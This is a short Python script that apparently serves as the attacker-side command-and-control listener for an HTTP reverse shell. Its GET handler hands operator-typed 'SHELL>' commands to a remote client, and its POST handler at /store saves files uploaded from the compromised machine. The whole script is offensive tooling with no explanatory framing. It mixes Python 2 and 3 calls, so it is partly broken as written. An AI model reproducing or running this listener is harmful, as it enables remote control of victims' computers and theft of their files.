
#!/usr/bin/python
# coding: utf-8
from http.server import BaseHTTPRequestHandler,HTTPServer
import cgi

HOST = "10.212.111.215"
PORT= 80

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(s):

        command = raw_input("SHELL>")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)

    def do_POST(s):

        if s.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=s.rfile,
                                          headers=s.headers,
                                          environ={'REQUEST_METHOD': 'POST'}
                                          )
                    print(pdict)
                    print("-------------------------------")
                    print(ctype)
                    print("-------------------------------")
                    print(fs['file'])
                else:
                    print("[-] Unexpected POST request")

                fs_up = fs['file']  # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'
                # to hold the actual file. Now here to retrieve the actual file, we use the corresponding key 'file'

                with open('/home/khalil/testhttp.txt','wb') as o:  # create a file holder called '1.txt' and write the received file into this '1.txt'
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print (e)


            return  # once we store the received file in our file holder, we exit the function


        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length'])
        variablePost = s.rfile.read(length)
        #print (variablePost)

if __name__ == '__main__':

    server_class = HTTPServer
    httpd = server_class((HOST, PORT), MyHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print ('[!] Server is terminated')
        httpd.server_close()
